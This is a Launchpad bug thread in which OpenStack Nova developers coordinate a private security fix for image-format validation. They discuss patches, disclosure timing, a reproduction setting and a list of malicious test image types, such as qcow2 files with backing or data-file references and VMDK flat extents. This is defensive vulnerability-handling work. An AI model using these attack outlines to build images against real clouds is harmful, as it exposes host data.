  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-02T20:52:45.357713+00:00" title="2024-07-02 20:52:45 UTC">on 2024-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This patch removes the explicit format passed to qemu-img in favor of a comparison with format_inspector after the fact. This means we still get a &quot;sniff test&quot; of what qemu thinks the image is, to catch things that are masquerading as raw images but contain more complex formats inside that qemu may later try to interpret. It&#x27;s yet another compromise in front of the real fix we need, which is a refactor of the whole image backend system to make this comprehensively better.</p>
<p>I&#x27;ll let Arnaud speak officially for himself, but I received feedback from him that this squashes the known cases of this bug already.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This patch removes the explicit format passed to qemu-img in favor of a comparison with format_inspector after the fact. This means we still get a "sniff test" of what qemu thinks the image is, to catch things that are masquerading as raw images but contain more complex formats inside that qemu may later try to interpret. It's yet another compromise in front of the real fix we need, which is a refactor of the whole image backend system to make this comprehensively better.

I'll let Arnaud speak officially for himself, but I received feedback from him that this squashes the known cases of this bug already.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in nova: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Confirmed
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-02T20:52:54.423927+00:00" title="2024-07-02 20:52:54 UTC">on 2024-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Since this report concerns a possible security risk, an incomplete<br />
security advisory task has been added while the core security<br />
reviewers for the affected project or projects confirm the bug and<br />
discuss the scope of any vulnerability along with potential<br />
solutions.</p>
<p>Given this was already partly discussed in late comments for <a href="/bugs/2059809" class="bug-link">bug<br />
#2059809</a> (deleted at the last minute for the sake of the advisory<br />
publication timeline in order to give everyone more time to solve<br />
it properly), we may publish any resulting patches as errata to<br />
OSSA-2024-001 rather than as a separate advisory, but can still<br />
perform advance notice to downstream stakeholders before doing so.</p>
<p>Arnaud asked me to additionally subscribe Felix from the previous<br />
bug (which I have done) and also Dan (who is subscribed already<br />
anyway as part of the nova-coresec group).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Since this report concerns a possible security risk, an incomplete
security advisory task has been added while the core security
reviewers for the affected project or projects confirm the bug and
discuss the scope of any vulnerability along with potential
solutions.

Given this was already partly discussed in late comments for bug
#2059809 (deleted at the last minute for the sake of the advisory
publication timeline in order to give everyone more time to solve
it properly), we may publish any resulting patches as errata to
OSSA-2024-001 rather than as a separate advisory, but can still
perform advance notice to downstream stakeholders before doing so.

Arnaud asked me to additionally subscribe Felix from the previous
bug (which I have done) and also Dan (who is subscribed already
anyway as part of the nova-coresec group).</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-02T21:39:21.023543+00:00" title="2024-07-02 21:39:21 UTC">on 2024-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I added Zack Miele and Sean Mooney from RedHat who have context here already.</p>
<p>I would like to propose that we let this marinate for a short period of time, especially since the rest of this week is problematic to do much else. That will give us some time to explore whether there are any other cases we can find that aren&#x27;t covered here and for proper review of the current situation. Then I think we should keep the inertia and notify the stakeholders soon (like next week) and plan to dispose of this quickly without letting it drag on. We might also want to set some ground rules about checking before expanding the scope of this like happened with the last one in case we find a big new thread to pull that would delay getting this fix out immediately, if possible.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I added Zack Miele and Sean Mooney from RedHat who have context here already.

I would like to propose that we let this marinate for a short period of time, especially since the rest of this week is problematic to do much else. That will give us some time to explore whether there are any other cases we can find that aren't covered here and for proper review of the current situation. Then I think we should keep the inertia and notify the stakeholders soon (like next week) and plan to dispose of this quickly without letting it drag on. We might also want to set some ground rules about checking before expanding the scope of this like happened with the last one in case we find a big new thread to pull that would delay getting this fix out immediately, if possible.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~felix.huettner" class="sprite person">Felix Huettner (felix.huettner)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-03T07:06:57.006990+00:00" title="2024-07-03 07:06:57 UTC">on 2024-07-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Since i will be absent next week i have subscribed Maxim to cover preparations for yaook.</p>
<p>Thanks everyone</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Since i will be absent next week i have subscribed Maxim to cover preparations for yaook.

Thanks everyone</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~arnaud-morin" class="sprite person">Arnaud Morin (arnaud-morin)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-03T07:21:54.896460+00:00" title="2024-07-03 07:21:54 UTC">on 2024-07-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>One note about how to reproduce: you have to set use_cow_<wbr />images=<wbr />false in nova.conf.<br />
Otherwise, the Qow class will be used and will partially catch the malicious images</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">One note about how to reproduce: you have to set use_cow_images=false in nova.conf.
Otherwise, the Qow class will be used and will partially catch the malicious images</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/6" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-03T17:46:08.164937+00:00" title="2024-07-03 17:46:08 UTC">on 2024-07-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/6"> #6</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;m updating the patch previously attached with this one. It&#x27;s almost identical, but with tests and one additional conditional that should ensure safety with a combination of non-cow environments and the deep inspection disabled, if so configured.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I'm updating the patch previously attached with this one. It's almost identical, but with tests and one additional conditional that should ensure safety with a combination of non-cow environments and the deep inspection disabled, if so configured.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sylvain-bauza" class="sprite person">Sylvain Bauza (sylvain-bauza)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-04T09:38:23.245106+00:00" title="2024-07-04 09:38:23 UTC">on 2024-07-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The additional tests are indeed appreciated. Looking at the implementation, I&#x27;m fine given we continue to be able disable the deep inspection.</p>
<p>I haven&#x27;t found any issues with the patch, LGTM.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The additional tests are indeed appreciated. Looking at the implementation, I'm fine given we continue to be able disable the deep inspection.

I haven't found any issues with the patch, LGTM.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-04T10:23:16.873325+00:00" title="2024-07-04 10:23:16 UTC">on 2024-07-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>as noted priviatly an inital review of the previous patch looked ok.<br />
in isolation the patch also looks ok but i want to test this with know good and bad images before we proceed.</p>
<p>felix also raised a gap in iso format support in the original bug as well as a an additional attack vector that enabling iso could introduce so I&#x27;m going to focus on  that first and then hopefully we can test this next week.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">as noted priviatly an inital review of the previous patch looked ok. 
in isolation the patch also looks ok but i want to test this with know good and bad images before we proceed.

felix also raised a gap in iso format support in the original bug as well as a an additional attack vector that enabling iso could introduce so I'm going to focus on  that first and then hopefully we can test this next week.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~felix.huettner" class="sprite person">Felix Huettner (felix.huettner)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-04T13:18:11.927064+00:00" title="2024-07-04 13:18:11 UTC">on 2024-07-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>thanks a lot @sean for covering that. I would not have posted it publicly if it would be exploitable</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">thanks a lot @sean for covering that. I would not have posted it publicly if it would be exploitable</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/10" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-04T14:55:09.755765+00:00" title="2024-07-04 14:55:09 UTC">on 2024-07-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/10"> #10</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;m just realizing that this will re-open the data-file exposure if you hide a bad qcow in a glance image claiming to be another format. We won&#x27;t know it&#x27;s a qcow, won&#x27;t safety-check it, and then will proceed to call qemu-img on it. I need to add in some code I had before that I removed to try to trim it down, but I&#x27;m realizing we still need it. It will use format-inspector&#x27;s detect method to make sure we agree with what glance thinks it is (like we&#x27;re doing below for qemu).</p>
<p>I&#x27;ll get that respun and tested, it might not happen today with the holiday.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I'm just realizing that this will re-open the data-file exposure if you hide a bad qcow in a glance image claiming to be another format. We won't know it's a qcow, won't safety-check it, and then will proceed to call qemu-img on it. I need to add in some code I had before that I removed to try to trim it down, but I'm realizing we still need it. It will use format-inspector's detect method to make sure we agree with what glance thinks it is (like we're doing below for qemu).

I'll get that respun and tested, it might not happen today with the holiday.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/11" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-04T16:54:06.252439+00:00" title="2024-07-04 16:54:06 UTC">on 2024-07-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/11"> #11</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2071734/+attachment/5794695/+files/unforce-format.patch" class="sprite haspatch-icon">unforce-format.patch</a>
        <a class="sprite edit action-icon" href="/nova/+bug/2071734/+attachment/5794695">Edit</a>
        
        (21.4 KiB,
        text/plain)
        
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Attached is a replacement patch that I think will plug the issues I just commented about. I have not tested it in devstack, only in unit tests. It has substantial changes from the one Arnaud initially verified, so we definitely need to scrutinize this. It adds format_inspector detection to make sure we don&#x27;t pass something claiming to be a raw to qemu that is actually something else.</p>
<p>Thus three layers of confirmation:</p>
<p>- Glance says it&#x27;s X<br />
- format_inspector detects it as an X, matches glance<br />
- qemu detects it as an X, matches format_inspector and glance</p>
<p>Also, AMI continues to be a real pain for strong assertions about what we accept. I think we really need to consider dropping support for that entirely, or come up with a subset of things we&#x27;re willing to accept inside an AMI (et al) and encode those rules here.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Attached is a replacement patch that I think will plug the issues I just commented about. I have not tested it in devstack, only in unit tests. It has substantial changes from the one Arnaud initially verified, so we definitely need to scrutinize this. It adds format_inspector detection to make sure we don't pass something claiming to be a raw to qemu that is actually something else.

Thus three layers of confirmation:

- Glance says it's X
- format_inspector detects it as an X, matches glance
- qemu detects it as an X, matches format_inspector and glance

Also, AMI continues to be a real pain for strong assertions about what we accept. I think we really need to consider dropping support for that entirely, or come up with a subset of things we're willing to accept inside an AMI (et al) and encode those rules here.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/12" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-04T17:22:08.193607+00:00" title="2024-07-04 17:22:08 UTC">on 2024-07-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/12"> #12</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve subscribed Thomas since he was following the state of this in the previous bug&#x27;s comments that were deleted immediately before disclosure, and expressed an interest in helping test fixes for the new regression.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've subscribed Thomas since he was following the state of this in the previous bug's comments that were deleted immediately before disclosure, and expressed an interest in helping test fixes for the new regression.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/13" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-05T16:26:09.101727+00:00" title="2024-07-05 16:26:09 UTC">on 2024-07-05</time><span class="editable-message-last-edit-date">
                <a href="#" class="editable-message-last-edit-link">(last edit <time itemprop="editTime" datetime="2024-07-05T16:36:08.214591+00:00" title="2024-07-05 16:36:08 UTC">on 2024-07-05</time>)</a>:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/13"> #13</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Still looking for detailed confirmation of the new patch, but I&#x27;ve now tested the latest version locally in devstack. I also am collecting a list of images, which hopefully are self-explanatory from the names:</p>
<p>bad-qcow-<wbr />with-backing.<wbr />qcow2<br />
bad-qcow-<wbr />with-datafile.<wbr />qcow2<br />
bad-vmdk-<wbr />flat-expose.<wbr />qcow2<br />
bad-vmdk-<wbr />flat-expose.<wbr />vmdk<br />
bad-vmdk-<wbr />sparse-<wbr />nbdurl.<wbr />vmdk<br />
good-qcow.qcow2<br />
good-raw.raw<br />
good-sparse-<wbr />vmdk.vmdk<br />
good-stream-<wbr />vmdk.vmdk</p>
